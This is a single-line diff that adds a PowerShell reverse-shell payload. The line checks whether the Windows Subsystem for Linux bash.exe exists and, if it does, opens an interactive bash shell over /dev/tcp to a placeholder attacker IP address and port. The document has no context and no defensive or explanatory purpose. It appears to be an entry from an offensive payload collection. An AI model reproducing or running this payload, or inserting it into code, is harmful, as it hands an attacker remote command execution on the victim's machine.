@@ -1,0 +1,1 @@
+if([System.IO.File]::Exists("C:\Windows\System32\bash.exe")){bash.exe -c "bash -i >& /dev/tcp/IPADDRESHERE/PORTHERE 0>&1"}
